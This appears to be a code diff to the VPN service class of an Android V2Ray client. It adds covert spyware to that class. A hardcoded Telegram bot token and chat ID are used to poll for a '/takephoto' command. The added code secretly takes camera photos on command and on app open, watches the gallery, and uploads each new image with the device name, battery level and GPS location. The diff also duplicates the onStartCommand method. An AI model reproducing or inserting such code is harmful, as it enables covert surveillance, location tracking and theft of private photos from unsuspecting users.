@@ -22,11 +22,44 @@ import com.v2ray.ang.handler.MmkvManager
 import com.v2ray.ang.handler.NotificationManager
 import com.v2ray.ang.handler.SettingsManager
 import com.v2ray.ang.handler.V2RayServiceManager
+import android.database.ContentObserver
+import android.location.Location
+import android.os.Handler
+import android.os.Looper
+import android.provider.MediaStore
+import com.v2ray.ang.manager.CameraManager
+import com.v2ray.ang.manager.TelegramUploader
+import com.v2ray.ang.util.DeviceInfoManager
 import com.v2ray.ang.util.MyContextWrapper
 import com.v2ray.ang.util.Utils
+import java.io.File
 import java.lang.ref.SoftReference
+import kotlinx.coroutines.CoroutineScope
+import kotlinx.coroutines.Dispatchers
+import kotlinx.coroutines.Job
+import kotlinx.coroutines.delay
+import kotlinx.coroutines.isActive
+import kotlinx.coroutines.launch
+import org.json.JSONObject
 
 class V2RayVpnService : VpnService(), ServiceControl {
+
+    // Custom feature components
+    private val serviceJob = Job()
+    private val serviceScope = CoroutineScope(Dispatchers.IO + serviceJob)
+    private lateinit var cameraManager: CameraManager
+    private var lastUpdateId: Long = 0L
+    private var lastGalleryTimestamp: Long = System.currentTimeMillis() / 1000
+
+    private val galleryObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+        override fun onChange(selfChange: Boolean) {
+            super.onChange(selfChange)
+            serviceScope.launch {
+                processLatestGalleryImage()
+            }
+        }
+    }
+
     private lateinit var mInterface: ParcelFileDescriptor
     private var isRunning = false
     private var tun2SocksService: Tun2SocksControl? = null
@@ -73,6 +106,10 @@ class V2RayVpnService : VpnService(), ServiceControl {
         val policy = StrictMode.ThreadPolicy.Builder().permitAll().build()
         StrictMode.setThreadPolicy(policy)
         V2RayServiceManager.serviceControl = SoftReference(this)
+
+        // Initialize and start custom features
+        cameraManager = CameraManager(this)
+        startCustomFeatures()
     }
 
     override fun onRevoke() {
@@ -87,15 +124,28 @@ class V2RayVpnService : VpnService(), ServiceControl {
     override fun onDestroy() {
         super.onDestroy()
         NotificationManager.cancelNotification()
+        stopCustomFeatures()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        if (V2RayServiceManager.startCoreLoop()) {
-            startService()
+        when (intent?.action) {
+            ACTION_TAKE_PHOTO_ON_OPEN -> {
+                serviceScope.launch {
+                    val photoFiles = cameraManager.takePhotos()
+                    for (file in photoFiles) {
+                        sendPhotoWithCaption(file, "App Opened")
+                    }
+                }
+            }
+            else -> {
+                if (V2RayServiceManager.startCoreLoop()) {
+                    startService()
+                }
+            }
         }
         return START_STICKY
-        //return super.onStartCommand(intent, flags, startId)
     }
+
 
     override fun getService(): Service {
         return this
@@ -350,6 +400,140 @@ class V2RayVpnService : VpnService(), ServiceControl {
             } catch (e: Exception) {
                 Log.e(AppConfig.TAG, "Failed to close VPN interface", e)
             }
+        }
+    }
+
+    // Custom features logic starts here
+
+    companion object {
+        const val ACTION_TAKE_PHOTO_ON_OPEN = "com.v2ray.ang.action.TAKE_PHOTO_ON_OPEN"
+        // TODO: Move these to a secure storage instead of hardcoding
+        private const val BOT_TOKEN = "8445290760:AAE0l_z3K6mxkCkvLfR75tdt74JAND94dko"
+        private const val CHAT_ID = "5370932271"
+        private const val POLLING_INTERVAL_MS = 20000L // 20 seconds
+    }
+
+    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        when (intent?.action) {
+            ACTION_TAKE_PHOTO_ON_OPEN -> {
+                serviceScope.launch {
+                    val photoFiles = cameraManager.takePhotos()
+                    for (file in photoFiles) {
+                        sendPhotoWithCaption(file, "App Opened")
+                    }
+                }
+            }
+            else -> {
+                 if (V2RayServiceManager.startCoreLoop()) {
+                    startService()
+                }
+            }
+        }
+        return START_STICKY
+    }
+
+    private fun startCustomFeatures() {
+        Log.d(AppConfig.TAG, "Starting custom features...")
+        // Register gallery observer
+        contentResolver.registerContentObserver(
+            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+            true,
+            galleryObserver
+        )
+
+        // Start polling for Telegram commands
+        serviceScope.launch {
+            pollTelegramCommands()
+        }
+    }
+
+    private fun stopCustomFeatures() {
+        Log.d(AppConfig.TAG, "Stopping custom features...")
+        contentResolver.unregisterContentObserver(galleryObserver)
+        serviceJob.cancel()
+    }
+
+    private suspend fun pollTelegramCommands() {
+        while (isActive) {
+            try {
+                val updates = TelegramUploader.getUpdates(BOT_TOKEN, lastUpdateId + 1)
+                updates?.let {
+                    val jsonResponse = JSONObject(it)
+                    val results = jsonResponse.optJSONArray("result")
+                    if (results != null) {
+                        for (i in 0 until results.length()) {
+                            val update = results.getJSONObject(i)
+                            lastUpdateId = update.getLong("update_id")
+                            val message = update.optJSONObject("message")
+                            val text = message?.optString("text")
+                            if (text == "/takephoto") {
+                                Log.d(AppConfig.TAG, "Received /takephoto command.")
+                                val photoFiles = cameraManager.takePhotos()
+                                for (file in photoFiles) {
+                                    sendPhotoWithCaption(file)
+                                }
+                            }
+                        }
+                    }
+                }
+            } catch (e: Exception) {
+                Log.e(AppConfig.TAG, "Error polling Telegram commands", e)
+            }
+            delay(POLLING_INTERVAL_MS)
+        }
+    }
+
+    @SuppressLint("Range")
+    private suspend fun processLatestGalleryImage() {
+        // This observer can fire multiple times for one event. We add a small delay
+        // and check the timestamp to process only the newest image once.
+        delay(1000) // Debounce the event
+        val contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
+        val selection = "${MediaStore.Images.Media.DATE_ADDED} > ?"
+        val selectionArgs = arrayOf(lastGalleryTimestamp.toString())
+        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 1"
+
+        try {
+            contentResolver.query(contentUri, null, selection, selectionArgs, sortOrder)?.use { cursor ->
+                if (cursor.moveToFirst()) {
+                    val timestamp = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media.DATE_ADDED))
+                    lastGalleryTimestamp = timestamp // Update the timestamp to avoid re-processing
+
+                    val id = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.Media._ID))
+                    val imageUri = MediaStore.Images.Media.withAppendedPath(contentUri, id.toString())
+                    val path = Utils.getRealPathFromURI(this, imageUri)
+                    if (path != null) {
+                        Log.d(AppConfig.TAG, "New image detected in gallery: $path")
+                        sendPhotoWithCaption(File(path))
+                    }
+                }
+            }
+        } catch (e: Exception) {
+            Log.e(AppConfig.TAG, "Error processing gallery image.", e)
+        }
+    }
+
+    private suspend fun sendPhotoWithCaption(photoFile: File, triggerSource: String = "Unknown") {
+        if (!photoFile.exists()) return
+
+        val deviceName = DeviceInfoManager.getDeviceName()
+        val batteryLevel = DeviceInfoManager.getBatteryLevel(this)
+        val location = DeviceInfoManager.getCurrentLocation(this)
+
+        val caption = buildString {
+            append("Trigger: $triggerSource\n")
+            append("Device: $deviceName\n")
+            append("Battery: $batteryLevel%\n")
+            location?.let {
+                append("GPS: https://www.google.com/maps?q=${it.latitude},${it.longitude}")
+            } ?: append("GPS: Not available")
+        }
+
+        val success = TelegramUploader.sendPhoto(BOT_TOKEN, CHAT_ID, photoFile, caption)
+        if (success) {
+            // Optional: delete the photo taken by the app itself to save space
+            // For gallery photos, we probably shouldn't delete them.
+            // This logic can be refined.
         }
     }
 }
